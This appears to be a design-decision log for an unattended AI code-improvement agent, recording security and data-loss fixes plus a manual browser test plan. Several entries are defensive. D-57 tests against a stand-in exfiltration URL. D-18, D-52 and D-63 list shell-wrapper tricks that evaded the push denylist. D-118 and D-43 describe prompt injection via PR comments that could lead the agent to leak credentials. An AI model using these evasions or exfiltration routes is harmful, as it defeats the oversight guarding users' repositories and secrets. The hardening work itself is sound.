| D-119 | The orphan-clone sweep cannot delete a clone that registers mid-sweep | `sweep_orphan_clones` snapshotted the set of clones owned by a live-or-work-holding watcher under `reg._lock`, RELEASED the lock, then iterated and `shutil.rmtree`'d each unmatched directory. A watcher that registers and creates its clone in the gap between the snapshot and the removal is NOT in the stale `keep` set — so the sweep deleted an ACTIVE watcher's tree and its unexported work, the same data loss the `keep` set exists to prevent, reached through a TOCTOU window (`GET /watchers` promotes watchers concurrently). Fixed by adding a point-of-use recheck (`_clone_is_currently_owned`) that recomputes ownership under `reg._lock` for the single directory about to be removed, IMMEDIATELY before `rmtree`; the bulk snapshot stays as a cheap first pass so most orphans are caught without serializing on the lock. The helper returns True (treat as owned, do not delete) on any error — a sweep that cannot prove a directory unowned must not delete it. Two tests in the CI-collected `test_reconcile_and_publish.py`: a watcher that registers mid-sweep keeps its clone (verified RED against the pre-fix single-snapshot code) and a genuinely-unowned clone is still reclaimed (no-regression, disk must not leak). Its advisory (non-blocking) FINDING that `bandCapMs`/`canaryAdvisory` should be hard-wired to `None`/`False` was NOT applied: both are deliberate, documented, default-safe operator opt-outs (the band cap's own comment says it "WEAKENS the anti-noise gate, so OFF by default; for a bounded demo/validation run only", `canaryAdvisory` is config-file-only, not `PUT /config`-writable), and hard-wiring them would delete operator controls that already default to the safe value — the relaxable-by-explicit-choice case D-15 distinguishes from a mandatory safety halt. |
| D-118 | The watcher refuses to run until its network-egress risk is acknowledged | The watcher agent is UNATTENDED, its prompt embeds outsider-writable PR-comment text, and it needs `gh` (host auth token + network) to read PR state — so it CANNOT be run under a strict credential+network sandbox without deleting the feature (D-84), and the provider-runner path (`SessionAgentRunner` → `AcpProvider`, `sandbox_mode` default `off`/`auto`) hides credential DIRECTORIES but does NOT isolate the network and does not apply the subprocess path's `strip_credential_env` (D-105). GPT flagged that this path does not GUARANTEE confinement: an injected instruction could read an exposed credential and send it out. Forcing strict mode would hide `~/.config/gh` and break the watcher's core `gh pr view`/`checks` work, and a real egress-isolating primitive is out of scope for a private fix (D-105) — so the residual risk is a genuine OPERATOR decision, not the runner's to silently accept. Resolved (operator choice) by making `_make_runner` FAIL CLOSED: it refuses to build ANY watcher runner unless `watcherAcceptEgressRisk` (default OFF, compared `is True`) is set — the same one-time-consent shape as D-107's `watcherAutoStart`. Six tests: absent/false/truthy-non-`True` values all refuse (verified RED pre-fix), an injected `_runner_factory` bypasses the gate so unit tests need no global flag, the gate is read fresh and precedes runner construction, and the config key is writable. This is the fourth iteration of the D-84/D-105/D-107 egress thread, now closed by an explicit consent gate rather than a silent acceptance. |
| D-116 | A failed bug push no longer corrupts the kept counter | `_apply_bug_winner`'s F10 direct-commit path incremented `stats.kept` ONLY in its SUCCESS arm (after a landed push), yet the push-failed `else` still ran `stats.kept -= 1`. The decrement was copied from the perf twin (`_apply_verdict`), where it is correct BECAUSE that path increments `kept` EAGERLY on keep, before the push — so a refused push must reverse it. The bug path has no eager increment, so the decrement subtracts from a counter this path never added to, driving `stats.kept` negative or undercounted in the `/run` result. Fixed by deleting the decrement; the `_reset_provisional(pre_sha)` rollback beside it (which keeps a refused commit from leaking into the next winner's push range) is load-bearing and stays. Two tests: the bug path's failed-push arm rolls back but does not decrement `kept` (verified RED pre-fix), and a premise guard that the perf twin's decrement is balanced by an eager increment that PRECEDES it — so if that eager `+= 1` ever moves, the perf path's `-= 1` is caught becoming as unbalanced as the bug one was. |
| D-114 | Uncommitted watcher work is not deleted as if exported | The uncommitted-work arm of the same data-loss family as D-83/D-100. `_export_is_durable` diffs `base...HEAD`, which sees COMMITTED history only, and the watcher's agent turn runs with Edit/Write/Bash (`_run_agent_pass`). So a fix the agent left UNCOMMITTED — a rejected commit, or a turn that edited files without committing — makes that diff empty even though real work exists, uncommitted, in a disposable clone whose origin is deliberately dead. `_export_is_durable` returned `(proc.stdout or "").strip() == ""` → True → `unexported_work` stayed False → the `_run_watcher` `finally` deleted the clone holding the only copy. D-100 closed the FAILED-diff door (stderr, empty stdout); this is the SUCCEEDING-empty-diff door beside it, where the tree is dirty. Fixed by gating the empty-committed-diff case on `git status --porcelain` being empty too — it lists tracked edits AND untracked new files, so it tells "produced nothing" apart from "produced uncommitted work"; a failing `git status` is treated as "cannot tell" and retains the clone, matching the failed-diff branch. Four tests: empty diff + dirty tree → not durable (verified RED pre-fix), empty diff + clean tree → still durable (no-regression, disk must not leak), a failing status → not durable, and an end-to-end path through a REAL git clone with an uncommitted edit (exercises git's actual porcelain output, not a stub — its literal `git init/add/commit` spawns are allowlisted in `test_spawn_audit.py`'s `BENIGN_SPAWNS`, test-owned cwd and dead origin, nothing agent-influenced). |
| D-113 | The prod-dependency audit is unblocked (repo-wide fix) | The required `Audit Production Dependencies` gate flipped from green to red on this branch with the dependency set BYTE-IDENTICAL between the two heads — a fresh advisory, not a code change. `scripts/check_npm_audit.py` runs `npm audit` against the LIVE advisory DB at CI time, and GHSA-7p8r-x3mc-p8w7 (fast-uri, high, vulnerable `>=3.0.0 <3.1.5`) published mid-review: PRs audited at 19:43–19:44Z passed, mine (19:56Z) and  (20:00Z) failed. `fast-uri` is pinned to `3.1.4` via the `overrides` block in `website/electron/package.json` (a prior security pin on `ajv`'s transitive dep), so the pin itself went vulnerable retroactively. NOT this feature's code — `main` carries the same 3.1.4 and the lockfile is one this branch never touches — but it is a required check, so it blocks merge for every open PR (like D-111's render-gate fix). Bumped the override to `3.1.5` (`fixAvailable: true`) and regenerated the lockfile (`npm install --package-lock-only --omit=dev`): a 3-line change to `fast-uri`'s version/URL/integrity, package count unchanged at 309, no dev deps pruned. Re-ran the exact gate: "audit passed: 3 lockfiles, 2 governed exceptions". Preferred a version bump over a `.vulnerability-exceptions.json` entry because the gate's own guidance reserves exceptions for when immediate remediation is impossible, and here the patch existed. |
| D-112 | A bug PR records the base it was TESTED against, not the fix | `_apply_bug_winner` commits the winning fix PROVISIONALLY (`_commit_bug_winner_provisional`) and only then builds the PR record — so `head_sha()` at that point is the FIX commit, and the `base_anchor` it wrote was `{branch} @ {head_sha()[:12]}`: the PR's own "tested against" provenance pointed at the very commit under review, a self-referential base a reviewer cannot use to see what the RED→GREEN gate actually ran on. `pre_sha` — the HEAD captured BEFORE the provisional commit (the revision the reproduce/verify gate measured) — is the correct anchor, and the perf twin in `_apply_verdict` already anchors on its own `base_sha` for exactly this reason. Fixed to `{branch} @ {pre_sha[:12]}`. Three tests: the bug arm's `emit_bug` must anchor on `pre_sha` (verified RED against the pre-fix `head_sha()` line), `pre_sha` is captured before the provisional commit advances HEAD, and the perf path still anchors on `base_sha` so the fix to one arm cannot silently reshape the other. |
| D-111 | The render gate can build the base tree again (repo-wide fix) | E2E failed with exit 2, not a finding: `check-i18n-render.mjs` exports the BASE commit with `git archive <sha> website` and builds it, but main's Connections page (``) added `pages/connections/registry.ts` importing `../../../../src/kiro_crew/connections/registry.json` — OUTSIDE the exported `website/` subtree — so rollup could not resolve it and every base build died. HEAD built fine (47s); only the base did not. NOT my code: measured that 4 other open PRs (///) fail the identical gate, and reproduced the export gap with a bare `git archive`. Fixed by adding `src/kiro_crew` to the archive pathspec — a pathspec, not the whole repo, so tar does not drag the entire tree every run. Verified end to end with `I18N_BASE_REF` set: `[base ...] built in 176s` and `PASS [vs-base] — no surface got worse`, where before it was `vite build failed`. This touches the shared gate rather than my feature, but it blocks every PR in the repo, mine included. |
| D-38 | Commit-message redaction fails closed | Both `commit._commit_message` and `Driver._redact_commit_message` fall back to a fixed prose-free subject when the redactor errors, rather than committing un-scanned agent text into permanent, pushed git history. |
| D-36 | Failed checkout refuses to start (both paths) | The run and calibrate paths continued on whatever HEAD the clone held when `checkout_branch` failed (run: only raised when scopeDiffBase set). Since `checkout_branch` tries remote-tracking AND local refs, a False means the branch exists nowhere, so both paths now RAISE rather than operate/measure on the wrong revision. |
| D-34 | Non-dict MCP arguments are rejected | `tools/call` with `"arguments": [1,2]` or a bare string returned `result` (coerced to `{}`) instead of INVALID_PARAMS. The handler now rejects a present-but-non-dict payload before coercion; absent/None/`{}` still valid. |
| D-71 | The perf filed path deliberately does NOT reset | `_reset_provisional` after the perf filed-PR event, by analogy with D-70's bug-track fix, is DECLINED: the perf loop is evolutionary ("current best == HEAD" is documented durable state, `base_sha` is re-read from HEAD each cycle, measurements read "Δ vs current best"), so resetting would re-measure every cycle against the ORIGINAL base and a second improvement to the same hot path could never register. The reported harm is real (measured: pushing whole HEAD for PR#2 included cycle 1's fix) and is recorded as a known limitation, because the correct remedy — a per-winner branch rebuilt from the remote base — is not a safe drop-in: measured, two cycles touching the SAME line produced a rebuild containing NEITHER fix. Two tests pin the deliberate perf/bug asymmetry so a "consistency" cleanup cannot silently disable cumulative measurement. |
| D-69 | The provisional commit message carries no model text | `wip(auto-improvement): staging {cand_id}` published unscanned model output: `cand_id` embeds the model-chosen `candidate.target`, and `_short` only restricts to alnum/`_`/`-` — the exact character class of an AWS key id. Measured: `src/m.py::AKIAIOSFODNN7EXAMPLE` produced `c1_wide_m_py_AKIAIOSFODNN7EXAMPLE_d469bc5b`, which `redact()` confirms is credential-shaped. The ordering is provisional commit → draft/push → redacted amend, so the amend cannot save it and a pushed message cannot be edited without rewriting history. Both sites now use a fixed message; the cand_id remains in the archive and ledger. |
| D-70 | Each bug PR carries only its own fix | A bug cycle files one draft PR per locus from ONE shared clone, and a FILED winner's provisional commit was left at HEAD — so the next winner's branch started from it. Measured on a real repo: winner B's `base...HEAD` range contained `FIX_A` as well as `FIX_B`. The not-filed path already reset; the success path did not. Review suggested capping the cycle at one bug winner, which discards verified independently-reproduced work; resetting keeps every winner AND keeps each PR to its own change. The structural test anchors on the `cr_filed` arm — an earlier `count(...) >= 2` version passed pre-fix and proved nothing. |
| D-68 | Config cannot be retargeted mid-run | `PUT /config` and `POST /setup-clone` had no run-active gate, but `branch` is in `_CONFIG_WRITABLE` and `store.workspace_key()` reads config FRESH (keying on `target_url` + `branch`) — so a mid-run edit moves the ruler, results, PR queue and profiles to a different key while the loop is still writing them. Measured: `branch` `origin/main` → `origin/feature` moved the key `..._repoa__main` → `..._repoa__feature`. Both now 409 `run_in_progress`. The four inline copies of this gate were collapsed onto one `_refuse_while_running` helper — a fourth hand-rolled copy is how the guarded status set drifts; the structural test now asserts all four handlers use it, and that the helper still consults the supervisor and returns 409. |
| D-67 | An empty diff scope means NOTHING, not the whole repo | `scoped_relpaths` did `return files or None`, so a valid-but-empty diff (`scopeDiffBase=HEAD`, which resolves fine) collapsed into "unscoped" and `RepoEditAllowlist` — which checks `scope is not None` — then permitted every path. Measured: `scopeDiffBase='HEAD'` returned `None`. Now returns `set()` for a successful-but-empty diff, `None` only for a blank ref or a git error, so the fence enforces "no file may be edited". This is the SECOND half of D-39: that round fixed the unresolvable-ref case and left the resolves-but-empty case falling through. The log label was also switched from truthiness to `is None`, which would otherwise have reported "repo" while the gate enforced zero files. |
| D-66 | Calibration refuses a failed or regressing canary | `POST /calibrate` used `abs(delta) > band`, ignoring both `canary.ok` and the ruler's improving DIRECTION, so it wrote `status="calibrated"` for two cases that prove the opposite. Measured against the spine's predicate at band=10 (minimize): a REGRESSION of `+25` passed, and a canary with `ok=False` passed. The backend now reuses the spine's `_canary_clears_band` (which handles ok/None/direction and is what Phase-1 preflight uses) instead of keeping a second, weaker copy — the duplicate is how they drifted. A test-stub `_M` lacking `ok` surfaced immediately, confirming the check is now enforced. |
| D-64 | The recipe's credential scan cannot self-diff | `base_ref` is `config["branch"]`, so a plain LOCAL name made `git diff work...HEAD` EMPTY when HEAD *is* `work` — `scan_content_for_secrets("")` reported clean and an agent-authored credential would be pushed unscanned. Measured on a real bare repo: 0 bytes with the local name (credential invisible) vs 132 bytes with `origin/work` (caught). `_scannable_base` now resolves to a ref distinct from HEAD (trying the remote-tracking form) and REFUSES when it cannot, rather than degrading to the narrower single-commit scan. Same bug already fixed in `driver._direct_push`; the recipe had its own copy. |
| D-65 | A refused direct push rolls its commit back | The failed-push branch only decremented a counter, leaving the refused commit at HEAD. Because the scan range is `HEAD~1..HEAD`, the NEXT winner's scan does not see it while its push publishes both — measured: candidate A refused for a planted `AKIAIOSFODNN7EXAMPLE`, then B's scan range showed the credential False while its pushed range showed True. Both tracks now `_reset_provisional(pre_sha)`; the bug track had no `else` at all and fell through to `return` with the commit intact. |
| D-63 | A valueless global option cannot swallow the subcommand | The option scanner assumed any option without `=` takes a value (its comment claimed this "cannot under-skip" — exactly backwards). Measured: bare `git push` REFUSED while `git --no-pager push`, `--paginate`, `--bare`, `--literal-pathspecs` and `--no-replace-objects` were all ALLOWED, because the valueless option consumed `push` as its value and the denylist matched `['origin','main']`. Value-taking global options are now enumerated per binary (`_VALUE_TAKING_OPTIONS`); anything unlisted is valueless, which can only over-refuse — safe for a denylist. `--exec-path` is deliberately excluded because its value is OPTIONAL (listing it reintroduced the same swallow — found by writing the 25-case matrix, not by the next pass). |
| D-62 | The subprocess fallback is no longer selected | The review asked for this on every head and was right on the facts. The keep-it argument ("the ONLY path when no in-process provider is configured") described a state that cannot occur: `create_provider_factory` has two returns (`AcpProvider(...)`, `_acp`) and NEVER returns None, so `SessionAgentRunner.available()` is False only when loading RAISES — a broken install. In that state shelling out with `--dangerously-skip-permissions` is worse, not better. Both sites (`runner._build_runner`, `pr_watchers._make_runner`) now go offline / refuse; the `AgentRunner` class is kept for a future caller that can route it properly. Two tests that pinned the old behaviour were rewritten to pin the new contract. |
| D-61 | Operator clone mutations serialize on one lock | The run-status gate stops these paths racing the LOOP, not each other: the commit icon had no `disabled` while pending, so two clicks started two mutations in separate `asyncio.to_thread` threads against the same clone. Measured on a real bare repo: A stages its diff, B's `checkout -B <branch> <base>` does NOT discard it, B's `apply --index` stacks on top, and B's commit contains BOTH findings — while A's now-empty commit fails and its `reset --hard` rewinds past B's pushed commit. Serialized on `commit.clone_lock()` (an `RLock`), held across the draft route's WHOLE sequence because the race is between the steps; the button is also disabled while any commit is in flight. The regression test FORCES the interleaving (a plain race reproduced it only ~1 run in 3): 3/3 fail without the lock, 3/3 pass with it. |
| D-60 | The watcher path refuses the same fall-through | `pr_watchers._make_runner` is the twin of `runner._build_runner` and had the identical hole: inside `if SessionAgentRunner.available():` a registration failure fell through to `claude -p`, bypassing a CONFIGURED provider's gate. Fixing only the first site made the review finding move straight from `runner.py` to `pr_watchers.py` — which is how the twin surfaced. It now RAISES (this function's contract), and `_run_watcher` converts that to `STATUS_ERROR`: a failed pass, not a dead gateway. All four selection paths pinned for both sites. |
| D-59 | A registration failure goes offline, not subprocess | `_build_runner` fell through to `AgentRunner` (`claude -p`) when `SessionAgentRunner.available()` was True but `ensure_agent_registered()` failed — so a CONFIGURED provider's permission gate was bypassed. Measured: that combination returned `AgentRunner`. Now returns `None` (offline). This is the real substance of the recurring "the fallback bypasses the ACP gate" objection, which earlier rounds declined as self-contradictory — true for the `available()` branch, false for the registration-failure branch. All four selection paths pinned. |
| D-58 | Browser-served feeds fail CLOSED | `runner._redact_activity` and `pr_watchers._redact` failed OPEN on the reasoning that "nothing here leaves the host" — but `status()` puts the activity list into the `GET /run` JSON and `GET /watchers/{fp}/log` returns lines verbatim with no second scan, so each is the ONLY pass before the browser. Measured with a raising redactor: `aws_secret_access_key=…` reached the `/run` payload. Both now substitute a fixed placeholder per unscannable string, keeping structure/timestamps so the feed stays usable. `security_posture.py` entries corrected from "Fail-open by design"; the stale "fail-open" governance-hook claim in the spec was fixed too (the code has been fail-closed since the Arbiter finding). |
| D-57 | The stored push destination is host-validated | `resolve_origin_url` returned `origin_url` VERBATIM while only the legacy `target_url` was validated — so a tampered `config.json` could redirect all three push exits (draft PR, F10 direct push, one-click commit). Measured: `https://attacker.example.com/exfil.git` came back unchanged under `origin_url` but was refused under `target_url`. Now host-allowlisted (exact match, so `evilgithub.com` / `github.com.attacker.net` fail; `http://` and `git://` refused; the `DISABLED_NO_PUSH` sentinel refused). Re-running `validate_target_url` was NOT usable — it accepts only `https://` input while setup persists the SSH form, which broke 3 existing tests; local bare-repo paths stay allowed since they have no network host. The security guidance on untrusted URL destinations prescribes exactly this allowlisting. |
| D-55 | Tool approval is one-shot, never persistent | `approve_tool(rid, always=True)` signals "always allow" (ACP backends may emit an `addRules` suggestion), so the provider stops sending permission requests and every LATER call skipped BOTH gates in `_approve` — the per-tool allowlist check and the `critical=True` audit-or-deny write. The unattended loop is exactly the caller that must re-decide per call; now approves one-shot. |
| D-56 | A queued change is not recorded as filed | `QUEUED:<fp>` means "on disk, no PR". Recording it as `filed` made it HARD-terminal in `known()` (deduped forever, never retried) and fed `filed_crs()` a non-URL for the watchers — measured: `known()` True, `filed_crs()` `['QUEUED:abc']`. Now recorded as SOFT-terminal `STATUS_ERROR` (retryable after cooldown) while `filed=True` is KEPT: `filed=False` also rolls the provisional commit back and decrements `kept`, discarding a verified RED×2→GREEN→STAYGREEN win because `gh` was missing (measured: `kept` 1→0). |
| D-54 | A failed one-click push leaves no commit behind | `commit_finding`'s LAST two exits (no pushable remote, push rejected) returned with the commit still on the branch, so `checkout_branch` — which prefers an existing local branch — made the next run treat the unpushed change as already-landed baseline. The earlier failure points already reset; these did not. Both now `reset --hard` to the fetched base and drop the now-nonexistent `sha` from the payload; the durable queue copy survives so a retry works. Same class as the draft route's rollback, in the sibling path. |
| D-53 | Agent tests cannot write Kiro Crew's own config | `mode="strict"` hides credential READS but does not make the filesystem read-only. Measured: a strict-mode child appended to `~/.kiro/crew/.data-home-ready` and exited 0 — `write_protected_home_paths()` is enforced by the HOOK layer, which a sandboxed subprocess never reaches. `_run` now masks the PARENT dir of each protected path via `extra_hidden_dirs` (a FILE path silently no-ops: the launcher's `SENSITIVE_DIRS` loop is `isdir`-guarded). Re-measured through `_run`: blocked, interpreter fine, all 71 real-subprocess gate tests still pass. Fail-soft if the helper is unavailable. |
| D-52 | The wrapper denylist covers shell BUILTINS | `_COMMAND_WRAPPERS` listed only PATH binaries, but a nested `sh -c "…"` argument is re-analyzed by the same table — so `command`/`exec`/`builtin` were an evasion. Measured: bare `git push` REFUSED while `command git push`, `exec git push` and `sh -c "command git push"` were ALLOWED. All three added; a companion test pins non-over-refusal (`command -v git`, `exec pytest -q` stay allowed). `command` came from review; `exec`/`builtin` were found by testing the neighbours. |
| D-51 | A failed draft rolls its commit back | Committing the staged diff put the change on the configured branch, and `checkout_branch` prefers an existing local branch — so a draft that published nothing (no `gh`, no network, refused push, or an unexpected raise) left the NEXT run adopting an unfiled commit as its baseline. Measured on a real bare repo: local `work` sat 1 commit ahead of a remote it was never pushed to. All three post-commit exits now `reset --hard` to the fetched base, matching what `commit_finding` already did at each of its failure points. |
| D-50 | The staged diff is COMMITTED before drafting | `git apply --index` stages but does not move `HEAD`, and `_push_fix_branch` pushes `HEAD:refs/heads/<branch>` — so the first version of the materialize fix published the BASE and omitted the queued fix entirely. Measured on a real bare repo: worktree `return 2`, pushed branch `return 1`. `commit_staged_for_draft` commits with the redaction-hardened `_commit_message`. The regression test now asserts the content read back off the REMOTE after a real push; asserting only the worktree is exactly how this survived the first round. |
| D-49 | The draft route refuses while a run is live | Making the draft route materialize its diff made it clone-MUTATING, so it needed the run-active gate its siblings had — and the first version omitted it. An interleaved draft runs `checkout -B`/`apply --index`/`reset --hard` in the tree the driver worker is mid-cycle on, discarding the loop's staged winner and pushing whatever HEAD results. Now 409 `run_in_progress` on RUNNING/CALIBRATING/STOPPING, plus a structural test asserting EVERY clone-mutating handler carries the gate. |
| D-47 | Manual draft materializes its own queued diff | `draft(diff=...)` only writes the queue copy while `_push_fix_branch` pushes the clone's `HEAD`, so drafting an OLDER finding published a LATER cycle's content. Measured on a real bare repo: finding A's diff adds `FINDING_A`, the branch pushed for A contained `FINDING_B`. `commit.py`'s fetch → `checkout -B` → `apply --index` block is extracted as `materialize_queued_diff` and called by both the commit and draft paths (extracted, not copied — that block carries the fetch-through-configured-url and never-trust-`origin/<branch>` fixes). A failed staging returns an error rather than drafting anyway. |
| D-46 | An unproven ruler is disclosed in the perf PR body | `perf_pr_description(ruler_proven=False)` emits a "Ruler not proven on this target" caveat, set by the driver from `PreflightResult.canary_cleared`; defaults True so a proven ruler stays silent. (This row originally also recorded a DECLINE of "default `canaryAdvisory` to False", justified by "strict mode would halt bug-track runs". That justification was false — the bug track skips ruler pre-flight entirely — and the decline was reversed; see D-72.) |
| D-45 | MCP dispatch is audited before the handler runs | Only outcomes were audited, and every outcome event fires after `fn(args)` or from an `except` block — so a handler dying in a way that frame cannot catch executed a tool with no audit trail. The dispatch now logs `outcome="invoked"` (the established SEL token) before the handler; a served call audits twice, pinned as an ordered pair. That event is also `critical=True` (audit-or-DENY): an unauditable call is REFUSED with `INTERNAL_ERROR` rather than served untraced, while outcome events stay fail-soft since the handler has already run. An earlier revision declined this on the grounds that the six handlers are pure reads — that weighed blast radius, but `sel`'s stated criterion is ATTENDEDNESS ("pass `critical=True` when the caller enforces audit-or-deny (e.g. an unattended heartbeat auto-approve)"), and this server is unattended with results going to an LLM. |
| D-48 | The subprocess fallback audits every tool it uses | The fallback logged one blanket `claude-cli` launch event, so a forensic query could not answer "did this run touch a shell?". It already parsed `tool_use` blocks for the UI feed but never persisted them; `_audit_fallback_tool` now records each (`outcome="invoked"`, redacted+truncated target hint). NOT `critical=True` — the tool has already run, so raising could only turn an audit-sink problem into a failed run; audit-or-deny for this path is the launch event plus the pre-spawn governance gate. |
| D-43 | No builtin agent pre-authorizes a tool | `discovery.json` listed `fs_read`/`fs_write`/`execute_bash` in `allowedTools`, which auto-approves them — and an auto-approved tool never reaches `hooks.on_tool_call` (it runs only from the `EVENT_PERMISSION_REQUEST` branch; `EVENT_TOOL_CALL` is documented informational-only, "hook results cannot block execution"). The governance gate was therefore inert for exactly the tools a prompt injection would use. `allowedTools` is now `[]`; `tools` is retained so requests are governed and audited rather than impossible. The test guards EVERY config in `agents/`, so a future one cannot reintroduce it. |
| D-44 | A landed manual commit supersedes its `filed` row | One-click commit pushed and returned a sha but never wrote to the ledger, so the record stayed `filed` — which drives the PR watchers and the UI's commit button, making a landed change read as an open PR and inviting a second commit. `ledger_admin.record_committed` appends a `committed` row carrying the sha (writing `cr`, never `pr`, or `LedgerEntry(**row)` raises `TypeError` and the event vanishes), and fails soft: the push already succeeded, so bookkeeping trouble must not report as an error. |
| D-42 | A rejected provisional commit discards its diff | A failed provisional commit (rejecting hook, gpg trouble) returned False with the candidate's diff still in the index, and the next candidate's `add -A` commit absorbed it. Measured on a real repo: candidate B's commit contained candidate A's REJECTED `m.py` change. Both provisional helpers now call `_discard_staged`, which collects the patch's ADDED paths from the index BEFORE `reset --hard` and removes them (a reset leaves them untracked, where the next `add -A` re-stages them) — targeted, not a blanket `git clean`. |
| D-40 | Rebased commit is re-verified before publishing | The push race retry rebased the verified commit onto the moved branch and pushed it WITHOUT re-measuring. A clean rebase says nothing about behaviour: measured on a real repo, our `g() -> 2` commit plus a branch-side new file asserting `g() == 3` rebased with exit **0** and the combined tree was **RED**, and that red tree was published. `_push_with_rebase` now re-verifies the replayed tree through the profile's build gate (fail-closed: False or raising returns the original rejection), keeping the measured 3-of-6 race recovery instead of deleting the retry. |
| D-41 | Ledger records the sha that landed | A rebase rewrites HEAD, so the caller's pre-push snapshot named a commit absent from the remote (measured across a rebase); both `committed` rows and the success log now use the sha read back from the clone after the push. |
| D-35 | Archive TSV survives agent text | A candidate `description` with a literal tab/newline shifted columns / split rows in `results.tsv`. `_cell` collapses tab/CR/LF to a space; the unaltered value survives in `candidates.jsonl`. |
| D-33 | Runtime push-disable checks BOTH urls | `RepoIsolation.push_disabled()` (the driver's start-time gate) checked only the `--push` url, so a clone with a live FETCH url — itself a push target — passed. Now checks both, matching `clone_setup._ok`. A push-only-disabled clone reports False; both-disabled reports True. |
| D-32 | Unattended approval routes through the governance gate | `SessionAgentRunner._run_async` consults `hooks.on_tool_call` (the platform chokepoint: enterprise ceiling, builtin denied rules, `~/.aws`/`~/.ssh` blocks) BEFORE the app-local checks and refuses on a platform deny. A `~/.aws/credentials` read is denied; a benign read is not; structural test pins the ordering. |
| D-31 | Pollute exclude matches Windows paths | `pollute._is_excluded` matched a subtree with `e.rstrip("/") + "/"`, so on Windows (paths use `\\`) the orchestrator's own data dir under a snapshot root would wrongly register as a leak and block the run. Now uses `os.sep`. Found once the app's pollute/preflight tests ran on the CI Windows shard; the symlink and `os.geteuid` tests are skipped where unsupported. |
| D-30 | Two app-test flakes fixed | The SEL-audit test relied on `KIROCREW_HOME` but `SecurityEventLog` is a process singleton (reset it + `sync=True` under tmp_path); the wall-clock canary test flaked under parallel load (0.3s×5 workload + bounded retry). Both surfaced only once the app tests joined CI collection. |
| D-29 | The app's pure-logic tests are collected by CI | `setup.cfg` `testpaths` was `test transfer`, excluding `src/.../auto_improvement/tests`, so `--cov=kiro_crew` counted the app's ~10.6k statements while running NONE of its tests (gate stuck ~69%). The subprocess-heavy tests spawn `git`/`pytest` through the profile's strict-mode sandbox and fail on the CI runner (measured: whole-dir collection gave ~24 environment-only failures — `_collected_count` = -1, "Author identity unknown"). So ONLY the 11 pure-logic test files are added to `testpaths`; measured to lift the gate ~69% → ~71.6% without the sandbox-fragile tests. Making those CI-portable is tracked separately. |
| D-28 | Agent registration never clobbers a user file | `ensure_agent_registered` writes `~/.kiro/agents/<name>.json` only when absent or byte-identical; a differing existing file is left intact and registration returns False (run falls back to the default agent). Idempotent re-register still succeeds. |
| D-26 | Direct-push secret scan covers a non-empty range | The F10 push scanned `{dest}..HEAD`, but `dest` is the local branch HEAD sits on the tip of, so the range was EMPTY and the fail-closed credential scan passed on 0 bytes — the gate was blind. Now scans `HEAD~1..HEAD` (the verified commit). Measured: a commit with an AWS key gave a 0-byte `<branch>..HEAD` diff vs a 144-byte `HEAD~1..HEAD` diff. Regressed when the checkout moved to the local branch (D-21). |
| D-25 | Measurer discipline is pinned | `spine/measurer.py` (interleaved A/B): warmups DISCARDED, aggregate is the MEDIAN (one outlier can't swing the keep number), same-sha checked before any boot, a ruler error on any rep aborts, RH-A/B ANDed across reps, REPRODUCE is an independent larger run. Scripted fake ruler, no backend. |
| D-24 | Direct-commit description is readable | The direct-commit queue copy wrote `<fp>.cr.md` while every reader opens `<fp>.pr.md` (the `.cr.md → .pr.md` rename never reached the spine writer), so a direct-committed fix's description was written to a filename nothing reads. Now writes `.pr.md`; a structural test pins that no non-test source writes the dead `.cr.md` name. |
| D-22 | Fingerprint validated at the HTTP boundary | Every `{fp}` route interpolates the value into a filesystem path, so an unvalidated `fp` is a traversal vector. All nine handlers now call `validate_fingerprint` (allowlist `^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$`, no `.`/`/`/`..`) via `_validated_fp`; a traversal value returns 400/404 and never reaches a path build. Input-validation guidance: allowlist at the boundary, fail closed. |
| D-23 | Calibration writes to its launched workspace | `_calibrate_loop` derives the ruler path from the CAPTURED config, not live `config.json` — a retarget mid-calibration (background thread) must not drop the ruler into another workspace and overwrite one calibrated on unrelated code. |
| D-21 | Multi-cycle commits accumulate, don't detach | The driver checked out `self.branch` (config form `origin/main`), which DETACHES HEAD onto the remote-tracking ref, orphaning each cycle's kept commit. Both stage sites now use `normalize_branch(self.branch)` (the local branch). Assert cycle-1's commit is still an ancestor of HEAD after cycle-2's checkout. |
| D-20 | One-click commit refuses during a live run | Committing while the supervisor is RUNNING/CALIBRATING/STOPPING interleaves two checkout/apply/push sequences in one clone. The handler returns 409 `run_in_progress` and never calls `commit_finding`; an idle state passes through. |
| D-18 | Wrappers cannot hide a forbidden verb | `sudo`/`env`/`timeout`/`nohup`/`xargs`/`nice`/`setsid`/`stdbuf` and `sh -c "…"` all bypassed the shell denylist (measured). Wrappers are stripped recursively, an option's value goes with the option, and a nested `-c` script is re-analyzed from the top. `timeout 5 pytest -q` must stay ALLOWED. |
| D-17 | Unscannable PR prose is not published | A `redact` that RAISES must degrade `draft()` to `QUEUED:<fp>` with `gh` never invoked — distinct from a scan that runs and finds a hit, which is redacted and ships. The queue copy is still written so the fix is not lost. |
| D-16 | Non-default branch is really checked out | In a push-disabled clone `checkout_branch` must land on the CONFIGURED branch, using `origin/<branch>` (already present, no network) rather than failing the fetch and falling through to a local-only lookup that exists for the default branch alone. Assert the working TREE, not the return value: the caller starts anyway on failure, so the symptom is a run that measures `main`. |
| D-15 | Pre-flight refuses, not just permits | A canary inside the band raises `RulerNotTrustedError`; a host leak raises `HostPollutionError` **even in advisory mode** (sensitivity is relaxable, safety is not); zero baseline samples raises rather than defaulting a band. A negative `floor` can never yield a negative band — with `band < 0`, `delta < -band` is satisfiable by a regression. |

---

### Manual acceptance plan

Run by hand before accepting a change to the loop; no automated test covers these.

#### Frontend cases

Driven headless with Playwright. Use the website's own `node_modules`
(`import { chromium } from 'playwright'`) and run the script **from inside `website/`** so
ESM resolves — the playwright-MCP defaults to system Chrome, which is not installed here.

| Case | Action | Expected |
|---|---|---|
| B-1 | Click **Auto-Improve** in the left nav | routes to `/auto-improvement`, renders `<h1>Auto-Improvement</h1>` (a partially-staged `dist` renders a dead click) |
| B-2 | Paste the chess_test URL → **Connect** | clone succeeds; repo shown; push-disabled state visible |
| B-3 | Base-branch dropdown | shows the **configured** branch, not "default" — config loads async, so the control must re-sync |
| B-4 | Config names a branch absent from the list | that value still appears — a `<select>` whose value matches no option silently renders the first entry, misreporting the target |
| B-5 | Toggle **autocommit** | persists via `PUT /config`; survives reload |
| B-6 | Click **Run** | activity feed streams; **Stop** reaches a terminal state |
| B-7 | Activity feed shapes | renders all four backend shapes (`{t,note}`, `{t,cycle,stage}`, `{t,cycle,stage,discovered,fresh}`, `{t,agent:{…}}`) without a React error — typing the feed as `string[]` crashes with a minified React error |
